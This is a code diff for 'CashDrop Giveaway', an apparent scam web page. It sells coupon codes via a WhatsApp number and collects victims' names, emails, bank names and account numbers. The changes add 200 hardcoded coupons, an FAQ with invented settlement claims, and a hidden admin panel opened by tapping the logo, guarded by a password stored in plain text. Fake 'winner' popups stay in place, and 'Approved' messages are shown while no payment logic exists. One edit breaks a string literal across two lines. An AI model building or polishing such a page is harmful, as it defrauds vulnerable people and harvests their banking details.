@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CashDrop Giveaway 💸</title>
-<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Outfit:wght=300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
   --gold: #FFD700;
@@ -68,6 +68,8 @@ body {
   -webkit-text-fill-color: transparent;
   background-clip: text;
   margin-bottom: 12px;
+  cursor: pointer;
+  user-select: none;
 }
 .hero p {
   color: var(--muted);
@@ -254,6 +256,48 @@ select option { background: #111; }
 .step h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 4px; color: var(--gold); }
 .step p { font-size: 0.75rem; color: var(--muted); line-height: 1.4; }
 
+/* FAQ SECTION */
+.faq-section {
+  margin: 30px 0;
+}
+.faq-item {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  margin-bottom: 10px;
+  overflow: hidden;
+}
+.faq-question {
+  padding: 14px 16px;
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--gold);
+  cursor: pointer;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  user-select: none;
+}
+.faq-answer {
+  padding: 0 16px;
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height 0.3s ease, padding 0.3s ease;
+  font-size: 0.82rem;
+  color: var(--muted);
+  line-height: 1.5;
+}
+.faq-item.active .faq-answer {
+  padding: 0 16px 14px 16px;
+  max-height: 200px;
+}
+.faq-toggle-icon {
+  transition: transform 0.3s ease;
+}
+.faq-item.active .faq-toggle-icon {
+  transform: rotate(180deg);
+}
+
 /* TESTIMONIALS */
 .section-title {
   font-family: 'Bebas Neue', sans-serif;
@@ -368,7 +412,7 @@ select option { background: #111; }
   margin-bottom: 14px;
   width: 100%;
 }
-.table-wrap { overflow-x: auto; }
+.table-wrap { overflow-y: auto; max-height: 300px; border: 1px solid var(--border); border-radius: 8px; }
 table { width: 100%; border-collapse: collapse; font-size: 0.78rem; }
 th {
   background: #1a1a1a;
@@ -377,6 +421,7 @@ th {
   text-align: left;
   font-weight: 600;
   white-space: nowrap;
+  position: sticky; top: 0; z-index: 10;
 }
 td {
   padding: 10px 8px;
@@ -459,12 +504,7 @@ td:first-child { color: var(--text); }
   font-size: 1.3rem;
   font-weight: 700;
   color: var(--text);
-  margin-bottom: 6px;
-}
-.modal .min-note {
-  font-size: 0.78rem;
-  color: var(--gold);
-  margin-bottom: 20px;
+  margin-bottom: 12px;
 }
 .btn-whatsapp {
   background: #25D366;
@@ -490,18 +530,6 @@ td:first-child { color: var(--text); }
   width: 100%;
   font-size: 0.85rem;
 }
-
-/* ADMIN LINK */
-.admin-link-wrap {
-  text-align: center;
-  margin-top: 40px;
-  padding-bottom: 20px;
-}
-.admin-link-wrap a {
-  color: #333;
-  font-size: 0.75rem;
-  text-decoration: none;
-}
 .spinner {
   display: inline-block;
   width: 14px; height: 14px;
@@ -524,7 +552,15 @@ td:first-child { color: var(--text); }
     <h3>GET YOUR COUPON</h3>
     <p>Send your payment via WhatsApp and receive your coupon code instantly!</p>
     <div class="whatsapp-num">+234 707 081 8332</div>
-    <div class="min-note">Minimum: ₦1,000 | You get 45% profit back!</div>
+    
+    <div class="form-group" style="text-align: left; margin-bottom: 15px;">
+      <label>Choose WhatsApp Type</label>
+      <select id="whatsappType">
+        <option value="messenger">WhatsApp Messenger</option>
+        <option value="business">WhatsApp Business</option>
+      </select>
+    </div>
+
     <button class="btn-whatsapp" onclick="openWhatsApp()">
       💬 Chat on WhatsApp
     </button>
@@ -547,7 +583,7 @@ td:first-child { color: var(--text); }
   <div class="hero">
     <div class="badge">🔴 LIVE GIVEAWAY</div>
     <div class="money-rain">💸💰💸</div>
-    <h1>CASHDROP<br>GIVEAWAY</h1>
+    <h1 onclick="handleLogoTap()">CASHDROP<br>GIVEAWAY</h1>
     <p>Enter your coupon code and receive instant cash directly to your bank account!</p>
   </div>
 
@@ -615,7 +651,7 @@ td:first-child { color: var(--text); }
       </div>
       <div class="form-group">
         <label>Account Number</label>
-        <input type="tel" id="accountNumber" placeholder="10-digit account number" maxlength="10">
+        <input type="text" id="accountNumber" placeholder="10-digit account number" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
       </div>
 
       <div style="margin-bottom:14px;">
@@ -632,6 +668,27 @@ td:first-child { color: var(--text); }
         CLAIM MY CASH 💰
       </button>
       <div class="msg" id="userMsg"></div>
+    </div>
+
+    <!-- FAQ SECTION -->
+    <div class="section-title">FREQUENTLY ASKED QUESTIONS ❓</div>
+    <div class="faq-section">
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">How do I get a coupon code? <span class="faq-toggle-icon">▼</span></div>
+        <div class="faq-answer">You can get a coupon code instantly by clicking the "Get Coupon" button next to the input field, choosing your WhatsApp variant, and making a request directly to our desk officers.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">How long does the deposit alert take? <span class="faq-toggle-icon">▼</span></div>
+        <div class="faq-answer">Once your layout application parameters and coupon validation are approved, it typically takes between 4 to 10 minutes for full settlement processing to complete.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">Can I use a coupon code more than once? <span class="faq-toggle-icon">▼</span></div>
+        <div class="faq-answer">No, each individual code is securely cryptographically locked and hardcoded. Once validated, its status dynamically switches to USED and cannot be rerun.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">What banks are supported for transactions? <span class="faq-toggle-icon">▼</span></div>
+        <div class="faq-answer">We fully support all primary traditional commercial entities and structural digital banking providers across Nigeria (including Moniepoint, OPay, PalmPay, Kuda, and others).</div>
+      </div>
     </div>
 
     <!-- TESTIMONIALS -->
@@ -697,9 +754,6 @@ td:first-child { color: var(--text); }
       </div>
     </div>
 
-    <div class="admin-link-wrap">
-      <a href="#" onclick="showLogin()">.</a>
-    </div>
   </div>
 </div>
 
@@ -724,7 +778,7 @@ td:first-child { color: var(--text); }
 <!-- ADMIN PANEL -->
 <div class="admin-wrap" id="adminPage">
   <div class="admin-header">
-    <div class="admin-title">⚡ ADMIN</div>
+    <div class="admin-title">⚡ ADMIN PANEL</div>
     <button class="btn-logout" onclick="showUser()">Logout</button>
   </div>
 
@@ -747,7 +801,7 @@ td:first-child { color: var(--text); }
 
   <!-- ALL COUPONS -->
   <div class="admin-card">
-    <h3>ALL COUPONS</h3>
+    <h3>ALL COUPONS (<span id="couponCount">0</span>)</h3>
     <div class="table-wrap">
       <table>
         <thead>
@@ -791,8 +845,269 @@ const ADMIN_PASSWORD = 'Dove5656';
 const WHATSAPP_NUMBER = '2347070818332';
 const WHATSAPP_MESSAGE = encodeURIComponent("Hello, I want to buy a coupon code for CashDrop Giveaway. Please send me my coupon code and send your account details for the coupon code.");
 
-// ========== STORAGE ==========
-function getCoupons() { try { return JSON.parse(localStorage.getItem('cd_coupons') || '[]'); } catch(e) { return []; } }
+// ========== HARDCODED INITIAL COUPONS (200 CODES) ==========
+const SPECIAL_CODES = [
+  { code: "NIN20", amount: 4000 },
+  { code: "PELLER20", amount: 50000 },
+  { code: "NIN203", amount: 20000 },
+  { code: "GREAT674", amount: 2000 }
+];
+
+const AUTO_GENERATED_CODES = [
+  { code: "DROP125", amount: 15000 },
+  { code: "GIFT328", amount: 10000 },
+  { code: "DROP792", amount: 30000 },
+  { code: "DROP704", amount: 20000 },
+  { code: "CASH130", amount: 7500 },
+  { code: "GIFT338", amount: 30000 },
+  { code: "CASH674", amount: 12000 },
+  { code: "QUICK325", amount: 25000 },
+  { code: "PAY928", amount: 5000 },
+  { code: "WIN814", amount: 20000 },
+  { code: "DROPMAX384", amount: 10000 },
+  { code: "GIFT881", amount: 18000 },
+  { code: "DROP194", amount: 20000 },
+  { code: "DROP467", amount: 18000 },
+  { code: "PAY926", amount: 5000 },
+  { code: "ALERT649", amount: 7500 },
+  { code: "QUICK180", amount: 30000 },
+  { code: "PAY949", amount: 35000 },
+  { code: "DROPMAX691", amount: 12000 },
+  { code: "DROP146", amount: 12000 },
+  { code: "PAY181", amount: 12000 },
+  { code: "DROP489", amount: 15000 },
+  { code: "ALERT750", amount: 18000 },
+  { code: "WIN479", amount: 18000 },
+  { code: "GIFT786", amount: 15000 },
+  { code: "DROP723", amount: 10000 },
+  { code: "GIFT267", amount: 25000 },
+  { code: "QUICK376", amount: 30000 },
+  { code: "GIFT801", amount: 18000 },
+  { code: "CASH334", amount: 5000 },
+  { code: "DROPMAX510", amount: 15000 },
+  { code: "DROP316", amount: 35000 },
+  { code: "DROPMAX317", amount: 25000 },
+  { code: "QUICK758", amount: 25000 },
+  { code: "WIN371", amount: 10000 },
+  { code: "GIFT862", amount: 30000 },
+  { code: "PAY864", amount: 35000 },
+  { code: "QUICK697", amount: 20000 },
+  { code: "DROPMAX324", amount: 10000 },
+  { code: "ALERT193", amount: 5000 },
+  { code: "DROP256", amount: 10000 },
+  { code: "QUICK710", amount: 7500 },
+  { code: "QUICK490", amount: 35000 },
+  { code: "ALERT641", amount: 15000 },
+  { code: "CASH796", amount: 7500 },
+  { code: "PAY887", amount: 18000 },
+  { code: "DROP400", amount: 20000 },
+  { code: "WIN564", amount: 5000 },
+  { code: "PAY612", amount: 10000 },
+  { code: "DROP991", amount: 15000 },
+  { code: "GIFT256", amount: 18000 },
+  { code: "WIN652", amount: 30000 },
+  { code: "CASH713", amount: 18000 },
+  { code: "ALERT119", amount: 7500 },
+  { code: "DROPMAX999", amount: 15000 },
+  { code: "GIFT159", amount: 12000 },
+  { code: "DROP187", amount: 25000 },
+  { code: "DROP878", amount: 30000 },
+  { code: "WIN231", amount: 25000 },
+  { code: "QUICK316", amount: 30000 },
+  { code: "GIFT830", amount: 15000 },
+  { code: "QUICK787", amount: 18000 },
+  { code: "ALERT629", amount: 25000 },
+  { code: "DROP353", amount: 12000 },
+  { code: "DROP446", amount: 5000 },
+  { code: "GIFT702", amount: 12000 },
+  { code: "CASH172", amount: 5000 },
+  { code: "GIFT169", amount: 5000 },
+  { code: "DROPMAX172", amount: 30000 },
+  { code: "GIFT385", amount: 25000 },
+  { code: "GIFT652", amount: 10000 },
+  { code: "ALERT348", amount: 25000 },
+  { code: "QUICK294", amount: 7500 },
+  { code: "DROP774", amount: 20000 },
+  { code: "DROPMAX533", amount: 20000 },
+  { code: "ALERT984", amount: 5000 },
+  { code: "DROP162", amount: 20000 },
+  { code: "DROPMAX919", amount: 7500 },
+  { code: "GIFT296", amount: 12000 },
+  { code: "ALERT243", amount: 20000 },
+  { code: "WIN385", amount: 25000 },
+  { code: "GIFT995", amount: 7500 },
+  { code: "ALERT927", amount: 30000 },
+  { code: "DROP151", amount: 30000 },
+  { code: "CASH195", amount: 12000 },
+  { code: "WIN516", amount: 25000 },
+  { code: "ALERT318", amount: 20000 },
+  { code: "CASH268", amount: 20000 },
+  { code: "CASH499", amount: 15000 },
+  { code: "ALERT392", amount: 20000 },
+  { code: "ALERT258", amount: 12000 },
+  { code: "PAY322", amount: 5000 },
+  { code: "CASH865", amount: 18000 },
+  { code: "CASH151", amount: 35000 },
+  { code: "ALERT614", amount: 30000 },
+  { code: "WIN158", amount: 30000 },
+  { code: "DROP971", amount: 10000 },
+  { code: "DROP709", amount: 7500 },
+  { code: "GIFT513", amount: 7500 },
+  { code: "GIFT692", amount: 35000 },
+  { code: "CASH734", amount: 7500 },
+  { code: "QUICK773", amount: 35000 },
+  { code: "DROPMAX367", amount: 12000 },
+  { code: "DROPMAX344", amount: 15000 },
+  { code: "QUICK234", amount: 15000 },
+  { code: "ALERT423", amount: 7500 },
+  { code: "CASH569", amount: 35000 },
+  { code: "DROP175", amount: 30000 },
+  { code: "GIFT618", amount: 15000 },
+  { code: "WIN457", amount: 7500 },
+  { code: "GIFT478", amount: 15000 },
+  { code: "WIN548", amount: 30000 },
+  { code: "PAY726", amount: 30000 },
+  { code: "CASH783", amount: 30000 },
+  { code: "PAY779", amount: 7500 },
+  { code: "WIN370", amount: 7500 },
+  { code: "DROP860", amount: 30000 },
+  { code: "WIN378", amount: 15000 },
+  { code: "GIFT834", amount: 18000 },
+  { code: "GIFT803", amount: 15000 },
+  { code: "ALERT357", amount: 5000 },
+  { code: "DROP749", amount: 20000 },
+  { code: "PAY145", amount: 5000 },
+  { code: "DROPMAX889", amount: 10000 },
+  { code: "PAY265", amount: 25000 },
+  { code: "QUICK674", amount: 5000 },
+  { code: "DROP177", amount: 10000 },
+  { code: "CASH954", amount: 18000 },
+  { code: "WIN540", amount: 10000 },
+  { code: "CASH415", amount: 18000 },
+  { code: "CASH466", amount: 12000 },
+  { code: "GIFT782", amount: 7500 },
+  { code: "DROPMAX898", amount: 30000 },
+  { code: "QUICK735", amount: 10000 },
+  { code: "GIFT985", amount: 10000 },
+  { code: "WIN522", amount: 5000 },
+  { code: "WIN854", amount: 18000 },
+  { code: "QUICK921", amount: 12000 },
+  { code: "PAY263", amount: 7500 },
+  { code: "QUICK993", amount: 5000 },
+  { code: "ALERT327", amount: 12000 },
+  { code: "ALERT458", amount: 15000 },
+  { code: "CASH775", amount: 12000 },
+  { code: "QUICK436", amount: 15000 },
+  { code: "DROP891", amount: 15000 },
+  { code: "DROPMAX756", amount: 30000 },
+  { code: "QUICK795", amount: 30000 },
+  { code: "DROPMAX128", amount: 7500 },
+  { code: "PAY282", amount: 35000 },
+  { code: "PAY139", amount: 7500 },
+  { code: "QUICK453", amount: 18000 },
+  { code: "QUICK720", amount: 30000 },
+  { code: "DROP494", amount: 35000 },
+  { code: "GIFT360", amount: 5000 },
+  { code: "QUICK101", amount: 30000 },
+  { code: "GIFT472", amount: 20000 },
+  { code: "DROP780", amount: 18000 },
+  { code: "DROPMAX779", amount: 7500 },
+  { code: "PAY619", amount: 15000 },
+  { code: "QUICK434", amount: 20000 },
+  { code: "PAY667", amount: 10000 },
+  { code: "GIFT530", amount: 20000 },
+  { code: "WIN730", amount: 35000 },
+  { code: "PAY515", amount: 30000 },
+  { code: "CASH411", amount: 15000 },
+  { code: "GIFT540", amount: 35000 },
+  { code: "DROPMAX576", amount: 25000 },
+  { code: "ALERT791", amount: 12000 },
+  { code: "ALERT912", amount: 10000 },
+  { code: "DROP390", amount: 30000 },
+  { code: "DROPMAX195", amount: 12000 },
+  { code: "PAY330", amount: 12000 },
+  { code: "WIN125", amount: 5000 },
+  { code: "GIFT586", amount: 35000 },
+  { code: "DROP566", amount: 20000 },
+  { code: "GIFT835", amount: 20000 },
+  { code: "ALERT509", amount: 12000 },
+  { code: "WIN771", amount: 5000 },
+  { code: "DROP897", amount: 20000 },
+  { code: "GIFT280", amount: 30000 },
+  { code: "ALERT151", amount: 30000 },
+  { code: "GIFT968", amount: 7500 },
+  { code: "ALERT236", amount: 25000 },
+  { code: "DROPMAX873", amount: 25000 },
+  { code: "QUICK950", amount: 30000 },
+  { code: "ALERT262", amount: 25000 },
+  { code: "ALERT365", amount: 12000 },
+  { code: "PAY884", amount: 30000 },
+  { code: "ALERT741", amount: 12000 },
+  { code: "PAY550", amount: 7500 },
+  { code: "PAY340", amount: 15000 },
+  { code: "DROPMAX427", amount: 30000 },
+  { code: "DROP241", amount: 10000 },
+  { code: "GIFT492", amount: 10000 },
+  { code: "GIFT165", amount: 20000 },
+  { code: "QUICK438", amount: 30000 }
+];
+
+// Combine special items and generated lists into standard storage structure
+const MASTER_COUPONS = [...SPECIAL_CODES, ...AUTO_GENERATED_CODES];
+
+// ========== LOGO TAP ENGINE ==========
+let logoTapCount = 0;
+let logoTapTimeout;
+function handleLogoTap() {
+  logoTapCount++;
+  clearTimeout(logoTapTimeout);
+  if (logoTapCount >= 5) {
+    logoTapCount = 0;
+    showLogin();
+  } else {
+    logoTapTimeout = setTimeout(() => { logoTapCount = 0; }, 2000);
+  }
+}
+
+// ========== FAQ COMPONENT TOGGLE ==========
+function toggleFaq(element) {
+  const parent = element.parentElement;
+  parent.classList.toggle('active');
+}
+
+// ========== STORAGE HANDLERS ==========
+function getCoupons() {
+  try {
+    let stored = localStorage.getItem('cd_coupons');
+    if (!stored) {
+      // Map master configurations seamlessly
+      const initialList = MASTER_COUPONS.map(c => ({
+        code: c.code,
+        amount: c.amount,
+        used: false,
+        usedBy: null,
+        createdAt: "System Hardcode"
+      }));
+      saveCoupons(initialList);
+      return initialList;
+    }
+    let parsed = JSON.parse(stored);
+    
+    // Safety sync: check if any master item is missing from active localStorage context
+    let missingAdded = false;
+    MASTER_COUPONS.forEach(mc => {
+      if (!parsed.find(p => p.code === mc.code)) {
+        parsed.unshift({ code: mc.code, amount: mc.amount, used: false, usedBy: null, createdAt: "System Sync" });
+        missingAdded = true;
+      }
+    });
+    if (missingAdded) saveCoupons(parsed);
+    
+    return parsed;
+  } catch(e) {
+    return [];
+  }
+}
 function saveCoupons(c) { localStorage.setItem('cd_coupons', JSON.stringify(c)); }
 function getClaims() { try { return JSON.parse(localStorage.getItem('cd_claims') || '[]'); } catch(e) { return []; } }
 function saveClaims(c) { localStorage.setItem('cd_claims', JSON.stringify(c)); }
@@ -807,6 +1122,7 @@ function showLogin() {
   document.getElementById('userPage').style.display = 'none';
   document.getElementById('loginPage').classList.add('active');
   document.getElementById('adminPage').classList.remove('active');
+  document.getElementById('adminPass').value = '';
 }
 function showAdmin() {
   document.getElementById('userPage').style.display = 'none';
@@ -826,7 +1142,7 @@ function adminLogin() {
   }
 }
 
-// ========== MODAL ==========
+// ========== MODAL SELECTOR LOGIC ==========
 function openCouponModal() {
   document.getElementById('couponModal').classList.add('active');
 }
@@ -834,7 +1150,14 @@ function closeModal() {
   document.getElementById('couponModal').classList.remove('active');
 }
 function openWhatsApp() {
-  window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${WHATSAPP_MESSAGE}`, '_blank');
+  const type = document.getElementById('whatsappType').value;
+  let url = "";
+  if (type === "business") {
+    url = `https://api.whatsapp.com/send?phone=${WHATSAPP_NUMBER}&text=${WHATSAPP_MESSAGE}`;
+  } else {
+    url = `https://wa.me/${WHATSAPP_NUMBER}?text=${WHATSAPP_MESSAGE}`;
+  }
+  window.open(url, '_blank');
   closeModal();
 }
 
@@ -843,9 +1166,15 @@ function createCoupon() {
   const code = document.getElementById('newCode').value.trim().toUpperCase();
   const amount = parseFloat(document.getElementById('newAmount').value);
   if (!code || !amount || amount < 1) return showMsg('adminMsg', '❌ Fill in all fields!', 'error');
+  
+  // Explicit administrative confirmation step
+  const confirmAction = confirm(`Are you sure you want to create coupon code "${code}" with amount ₦${amount.toLocaleString()}?`);
+  if (!confirmAction) return;
+
   const coupons = getCoupons();
   if (coupons.find(c => c.code === code)) return showMsg('adminMsg', '❌ Code already exists!', 'error');
-  coupons.push({ code, amount, used: false, usedBy: null, createdAt: new Date().toLocaleString() });
+  
+  coupons.unshift({ code, amount, used: false, usedBy: null, createdAt: new Date().toLocaleString() });
   saveCoupons(coupons);
   document.getElementById('newCode').value = '';
   document.getElementById('newAmount').value = '';
@@ -857,6 +1186,8 @@ function createCoupon() {
 function renderCoupons() {
   const body = document.getElementById('couponTableBody');
   const coupons = getCoupons();
+  document.getElementById('couponCount').textContent = coupons.length;
+  
   if (coupons.length === 0) {
     body.innerHTML = '<tr><td colspan="3" class="empty-state">No coupons created yet</td></tr>';
     return;
@@ -865,7 +1196,7 @@ function renderCoupons() {
     <tr>
       <td style="color:#FFD700; font-weight:700; letter-spacing:1px;">${c.code}</td>
       <td>₦${c.amount.toLocaleString()}</td>
-      <td class="${c.used ? 'badge-used' : 'badge-active'}">${c.used ? '✗ Used' : '✓ Active'}</td>
+      <td class="${c.used ? 'badge-used' : 'badge-active'}">${c.used ? '✗ USED' : '✓ Active'}</td>
     </tr>
   `).join('');
 }
@@ -897,7 +1228,8 @@ function exportCSV() {
   if (claims.length === 0) return alert('No claims to export!');
   const headers = ['Name', 'Email', 'Bank', 'Account Number', 'Coupon Code', 'Amount', 'Time'];
   const rows = claims.map(c => [c.name, c.email, c.bank, c.account, c.code, `NGN ${c.amount}`, c.time]);
-  const csv = [headers, ...rows].map(r => r.join(',')).join('\n');
+  const csv = [headers, ...rows].map(r => r.join(',')).join('
+');
   const blob = new Blob([csv], { type: 'text/csv' });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
@@ -918,52 +1250,44 @@ function claimCoupon() {
     return showMsg('userMsg', '❌ Please fill in all fields!', 'error');
   }
   if (account.length !== 10) {
-    return showMsg('userMsg', '❌ Account number must be 10 digits!', 'error');
+    return showMsg('userMsg', '❌ Account number must be exactly 10 digits!', 'error');
   }
   if (!email.includes('@')) {
     return showMsg('userMsg', '❌ Please enter a valid email!', 'error');
   }
 
-  // Check duplicates
-  const claims = getClaims();
-  if (claims.find(c => c.email === email)) {
-    return showMsg('userMsg', '❌ This email has already claimed a coupon!', 'error');
-  }
-  if (claims.find(c => c.account === account)) {
-    return showMsg('userMsg', '❌ This account number has already been used!', 'error');
-  }
-
-  // Validate coupon
+  // Validate coupon pool elements
   const coupons = getCoupons();
   const coupon = coupons.find(c => c.code === code);
   if (!coupon) {
     return showMsg('userMsg', '❌ Invalid coupon code! Contact admin on WhatsApp.', 'error');
   }
   if (coupon.used) {
-    return showMsg('userMsg', '❌ This coupon code has already been used!', 'error');
+    return showMsg('userMsg', 'USED', 'error');
   }
 
-  // Mark coupon as used
+  // Mark coupon as used safely
   coupon.used = true;
   coupon.usedBy = name;
   saveCoupons(coupons);
 
-  // Save claim
-  claims.push({
+  // Append new unique client claim records object tracking parameters
+  const claims = getClaims();
+  claims.unshift({
     name, email, bank, account, code,
     amount: coupon.amount,
     time: new Date().toLocaleString()
   });
   saveClaims(claims);
 
-  // Clear form
+  // Reset text inputs safely
   document.getElementById('fullname').value = '';
   document.getElementById('email').value = '';
   document.getElementById('bank').value = '';
   document.getElementById('accountNumber').value = '';
   document.getElementById('couponCode').value = '';
 
-  showMsg('userMsg', `🎉 Claim successful! ₦${coupon.amount.toLocaleString()} will be sent to your ${bank} account within minutes!`, 'success');
+  showMsg('userMsg', 'Approved! Wait 4-10 minutes for alert', 'success');
 }
 
 // ========== SHOW MSG ==========
@@ -975,26 +1299,16 @@ function showMsg(id, text, type) {
 
 // ========== POPUP NOTIFICATIONS ==========
 const notifNames = [
-  { name: 'Chukwuemeka', initial: 'C' },
-  { name: 'Amaka', initial: 'A' },
-  { name: 'Tunde', initial: 'T' },
-  { name: 'Blessing', initial: 'B' },
-  { name: 'Ngozi', initial: 'N' },
-  { name: 'Emeka', initial: 'E' },
-  { name: 'Seun', initial: 'S' },
-  { name: 'Chioma', initial: 'C' },
-  { name: 'Biodun', initial: 'B' },
-  { name: 'Kelechi', initial: 'K' },
-  { name: 'Funmilayo', initial: 'F' },
-  { name: 'Oluwaseun', initial: 'O' },
-  { name: 'Adaeze', initial: 'A' },
-  { name: 'Taiwo', initial: 'T' },
-  { name: 'Ifeanyi', initial: 'I' },
-  { name: 'Precious', initial: 'P' },
-  { name: 'Chidi', initial: 'C' },
-  { name: 'Yetunde', initial: 'Y' },
-  { name: 'Obinna', initial: 'O' },
-  { name: 'Sade', initial: 'S' }
+  { name: 'Chukwuemeka', initial: 'C' }, { name: 'Amaka', initial: 'A' },
+  { name: 'Tunde', initial: 'T' }, { name: 'Blessing', initial: 'B' },
+  { name: 'Ngozi', initial: 'N' }, { name: 'Emeka', initial: 'E' },
+  { name: 'Seun', initial: 'S' }, { name: 'Chioma', initial: 'C' },
+  { name: 'Biodun', initial: 'B' }, { name: 'Kelechi', initial: 'K' },
+  { name: 'Funmilayo', initial: 'F' }, { name: 'Oluwaseun', initial: 'O' },
+  { name: 'Adaeze', initial: 'A' }, { name: 'Taiwo', initial: 'T' },
+  { name: 'Ifeanyi', initial: 'I' }, { name: 'Precious', initial: 'P' },
+  { name: 'Chidi', initial: 'C' }, { name: 'Yetunde', initial: 'Y' },
+  { name: 'Obinna', initial: 'O' }, { name: 'Sade', initial: 'S' }
 ];
 const amounts = [5000, 8000, 10000, 12000, 15000, 18000, 20000, 25000, 30000, 35000, 40000, 45000, 50000, 60000, 75000, 80000];
 
@@ -1012,11 +1326,14 @@ function showNotification() {
   }, 3500);
 }
 
-// Start notifications after 3 seconds, then every 10 seconds
+// Start notifications after 3 seconds, then run precisely every 1 minute (60,000 milliseconds)
 setTimeout(() => {
   showNotification();
-  setInterval(showNotification, 10000);
+  setInterval(showNotification, 60000);
 }, 3000);
+
+// Initialize initial coupons lists into memory cache automatically
+getCoupons();
 </script>
 </body>
 </html>
